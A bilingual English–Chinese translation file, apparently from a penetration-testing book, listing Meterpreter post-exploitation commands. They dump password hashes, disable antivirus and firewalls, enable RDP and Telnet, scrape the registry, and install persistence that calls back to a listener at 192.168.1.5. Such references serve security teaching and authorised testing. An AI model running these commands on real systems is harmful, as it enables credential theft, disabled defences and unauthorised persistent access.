- en: '`meterpreter > run post/windows/gather/hashdump`: Dumps the local users'' accounts
    on the compromised host using the registry.'
  id: totrans-127
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/hashdump`：使用注册表转储受害主机上的本地用户账户。'
- en: '`meterpreter > run post/windows/gather/usb_history`: Enumerates the USB drive
    history on the compromised system.'
  id: totrans-128
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run post/windows/gather/usb_history`：枚举受害系统上的USB驱动器历史记录。'
- en: '`meterpreter > run getcountermeasure`: Checks the security configuration on
    the victims'' system and can disable other security measures, such as A/V, the
    firewall, and much more.'
  id: totrans-129
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run getcountermeasure`：检查受害者系统的安全配置，并能禁用其他安全措施，如A/V、防火墙等。'
- en: '`meterpreter > run getgui -e`: Enables RDP on a target system if it is disabled.'
  id: totrans-130
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run getgui -e`：如果目标系统的RDP被禁用，则启用RDP。'
- en: '`meterpreter > run gettelnet -e`: Enables Telnet on the victim if it is disabled.'
  id: totrans-131
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run gettelnet -e`：如果Telnet在受害者系统中被禁用，则启用Telnet。'
- en: '`meterpreter > run killav`: Disables most antivirus programs running as a service
    on a target.'
  id: totrans-132
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run killav`：禁用目标上作为服务运行的大部分杀毒软件。'
- en: '`meterpreter > run remotewinenum -u administrator -p password123 -t 10.0.0.100`:
    Enumerates the system information through `wmic` on the victim. Makes note of
    where the logs are stored.'
  id: totrans-133
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run remotewinenum -u administrator -p password123 -t 10.0.0.100`：通过`wmic`枚举受害者的系统信息。记录日志存储位置。'
- en: '`meterpreter > run scraper`: Grabs the system information, including the entire
    registry'
  id: totrans-134
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run scraper`：抓取系统信息，包括整个注册表。'
- en: '`meterpreter > run winenum`: This makes for a very detailed Windows enumeration
    tool. It dumps tokens, hashes, and much more.'
  id: totrans-135
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run winenum`：这是一款非常详细的 Windows 枚举工具。它会导出令牌、哈希值等更多信息。'
- en: '`meterpreter > run persistence -U -i 10 -p 443 -r 192.168.1.5`: Configures
    our persistent Meterpreter session to wait until a user logs on to the remote
    system and tries to connect back to our listener every 10 seconds at IP address
    `192.168.1.5` on port `443`.'
  id: totrans-136
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`meterpreter > run persistence -U -i 10 -p 443 -r 192.168.1.5`：配置我们的持久化 Meterpreter
    会话，直到用户登录到远程系统并尝试每 10 秒通过 `192.168.1.5` 的 `443` 端口回连到我们的监听器。'
